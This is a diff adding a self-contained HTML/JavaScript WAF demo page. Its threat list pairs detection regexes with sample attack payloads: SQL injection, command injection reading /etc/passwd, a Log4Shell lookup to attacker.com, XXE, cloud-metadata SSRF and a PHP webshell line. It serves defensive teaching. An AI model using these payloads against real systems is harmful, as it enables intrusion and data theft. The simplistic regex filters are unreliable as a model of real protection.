@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Total-Coverage WAF Shield</title>
+    <style>
+        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --primary: #238636; --danger: #f85149; --et: #a371f7; --hint: #d29922; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 20px; }
+        .container { max-width: 1200px; margin: auto; background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 30px; }
+        .config-box { background: #010409; border: 1px solid var(--border); padding: 20px; border-radius: 8px; margin-bottom: 25px; }
+        .level-btns { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 15px 0; }
+        .btn { padding: 12px; border: 1px solid var(--border); background: #21262d; color: #fff; cursor: pointer; border-radius: 6px; font-weight: bold; transition: 0.2s; }
+        .btn.active { background: var(--primary); border-color: #3fb950; }
+        .btn.set-btn { background: #30363d; border: 1px solid #58a6ff; width: 100%; margin-top: 10px; color: #58a6ff; }
+        .btn.et-btn { background: var(--et); border: none; color: white; margin-top: 10px; width: 100%; }
+        
+        .monitor-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
+        input { width: 100%; padding: 15px; background: #0d1117; border: 1px solid var(--border); color: #fff; border-radius: 6px; margin: 10px 0; box-sizing: border-box; }
+        .log-box { background: #000; border: 1px solid var(--border); padding: 15px; height: 450px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 11px; color: #79c0ff; border-radius: 6px; }
+        .sidebar { background: #010409; padding: 15px; border: 1px solid var(--border); border-radius: 6px; overflow-y: auto; height: 550px; }
+        .attack-entry { font-size: 11px; margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 4px; }
+        .alert { padding: 15px; border-radius: 6px; margin-bottom: 15px; font-weight: bold; text-align: center; }
+        .alert-danger { background: rgba(248, 81, 73, 0.1); border-color: var(--danger); color: var(--danger); border: 1px solid; }
+        .alert-success { background: rgba(63, 185, 80, 0.1); border-color: var(--primary); color: var(--primary); border: 1px solid; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🛡️ Total-Coverage WAF Control Center</h1>
+    
+    <div class="config-box">
+        <strong>1. Active Security Posture:</strong>
+        <div class="level-btns">
+            <button class="btn" onclick="selectLvl('VERY LOW', this)">VERY LOW</button>
+            <button class="btn active" onclick="selectLvl('LOW', this)">LOW</button>
+            <button class="btn" onclick="selectLvl('HIGH', this)">HIGH</button>
+            <button class="btn" onclick="selectLvl('IMPOSSIBLE', this)">IMPOSSIBLE</button>
+        </div>
+        <button class="btn set-btn" onclick="applyPolicy()">💾 SET & DEPLOY POLICY</button>
+        <button class="btn et-btn" onclick="runFullSimulation()">🛸 RUN ALL-ATTACK "E.T." SIMULATION</button>
+    </div>
+
+    <div id="statusAlert" class="alert" style="display:none">System Standby</div>
+
+    <div class="monitor-grid">
+        <div>
+            <input type="text" id="payload" placeholder="Input test payload...">
+            <button class="btn active" style="width:100%" onclick="inspect()">MANUAL SCAN</button>
+            <h3>📜 Real-time Security Events</h3>
+            <div class="log-box" id="logs">Select level and click SET.</div>
+        </div>
+        
+        <div class="sidebar">
+            <h3>Active Threat Signatures</h3>
+            <div id="signatureList"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let tempLvl = "LOW";
+    let activeLvl = "LOW";
+
+    // THE COMPLETE ATTACK DATABASE
+    const threatDatabase = [
+        // 1. Injection
+        { name: "SQL Injection", reg: /union|select|drop|--|#|'|%27/i, p: "admin' OR '1'='1" },
+        { name: "NoSQL Injection", reg: /\$gt|\$ne|\$where|\$regex/i, p: '{"$ne": null}' },
+        { name: "Command Injection", reg: /[;&|`\$\(\)]/g, p: "127.0.0.1; cat /etc/passwd" },
+        { name: "LDAP Injection", reg: /[()|&!]/g, p: "*(|(uid=*))" },
+        // 2. Scripting & Protocol
+        { name: "XSS (Cross-Site Scripting)", reg: /<script|alert\(|onerror|onload|javascript:/i, p: "<img src=x onerror=alert(1)>" },
+        { name: "Log4Shell (JNDI)", reg: /\$\{jndi:(ldap|rmi|dns):/i, p: "${jndi:ldap://attacker.com/a}" },
+        { name: "HTTP Request Smuggling", reg: /Transfer-Encoding|Content-Length/i, p: "Transfer-Encoding: chunked" },
+        // 3. File & Path
+        { name: "Path Traversal (LFI/RFI)", reg: /\.\.\/|\.\.\\|etc\/passwd/i, p: "../../../etc/passwd" },
+        { name: "XXE (XML External Entity)", reg: /<!ENTITY|SYSTEM|PUBLIC/i, p: "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>" },
+        // 4. Server-Side 
+        { name: "SSRF (Metadata Attack)", reg: /169\.254\.169\.254|localhost|127\.0\.0\.1/i, p: "http://169.254.169.254/latest/meta-data/" },
+        { name: "SSTI (Template Injection)", reg: /\{\{.*\}\}|\$\{.*\}|\[%.*%\]/i, p: "{{7*7}}" },
+        // 5. Shell & Binaries
+        { name: "RCE (Binary/Shell)", reg: /bin\/bash|cmd\.exe|powershell|curl|wget|chmod/i, p: "/bin/bash -i" },
+        { name: "WebShell Detection", reg: /eval\(.*_POST|system\(.*_GET/i, p: "eval($_POST['cmd']);" },
+        // 6. Others
+        { name: "Open Redirect", reg: /url=|redirect=|dest=/i, p: "?url=http://malicious.com" },
+        { name: "Mail Header Injection", reg: /bcc:|to:|cc:|%0a|%0d/i, p: "victim@test.com%0aBcc:spam@evil.com" }
+    ];
+
+    // Build sidebar
+    const sigList = document.getElementById("signatureList");
+    threatDatabase.forEach(t => {
+        sigList.innerHTML += `<div class="attack-entry"><strong>${t.name}</strong></div>`;
+    });
+
+    function selectLvl(lvl, btn) {
+        tempLvl = lvl;
+        document.querySelectorAll('.level-btns .btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+    }
+
+    function applyPolicy() {
+        activeLvl = tempLvl;
+        addLog(`[CONFIG] System updated to [${activeLvl}]`, "#3fb950");
+        updateAlert(`Shield Active: ${activeLvl}`, "success");
+    }
+
+    function addLog(msg, color="#79c0ff") {
+        const box = document.getElementById("logs");
+        box.innerHTML = `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + box.innerHTML;
+    }
+
+    function updateAlert(msg, type) {
+        const alert = document.getElementById("statusAlert");
+        alert.style.display = "block";
+        alert.className = `alert alert-${type === 'success' ? 'success' : 'danger'}`;
+        alert.innerText = msg;
+    }
+
+    function inspect(autoPayload = null) {
+        const input = autoPayload || document.getElementById("payload").value;
+        if (!input) return;
+        let blocked = false;
+        let detectionType = "";
+
+        if (activeLvl === "VERY LOW") {
+            if (input.includes("<script>")) { blocked = true; detectionType = "Static XSS"; }
+        } else if (activeLvl === "LOW") {
+            for (let t of threatDatabase) { if (t.reg.test(input)) { blocked = true; detectionType = t.name; break; } }
+        } else if (activeLvl === "HIGH") {
+            const decoded = decodeURIComponent(input).toLowerCase();
+            for (let t of threatDatabase) { if (t.reg.test(decoded)) { blocked = true; detectionType = t.name; break; } }
+        } else if (activeLvl === "IMPOSSIBLE") {
+            if (!/^[a-zA-Z0-9 ]*$/.test(input)) { blocked = true; detectionType = "Strict Zero-Trust Violation"; }
+        }
+
+        if (blocked) {
+            updateAlert(`🚫 BLOCK: ${detectionType}`, "danger");
+            addLog(`DETECTION: [${detectionType}] Payload: ${input}`, "#f85149");
+        } else {
+            updateAlert(`✅ CLEAN`, "success");
+            addLog(`ALLOW: Request accepted.`, "#3fb950");
+        }
+    }
+
+    async function runFullSimulation() {
+        addLog("🚀 LAUNCHING TOTAL-COVERAGE ATTACK SIMULATION...", "#a371f7");
+        for (let t of threatDatabase) {
+            document.getElementById("payload").value = t.p;
+            addLog(`🛸 Probe: ${t.name}`, "#a371f7");
+            inspect(t.p);
+            await new Promise(r => setTimeout(r, 800));
+        }
+    }
+</script>
+</body>
+</html>
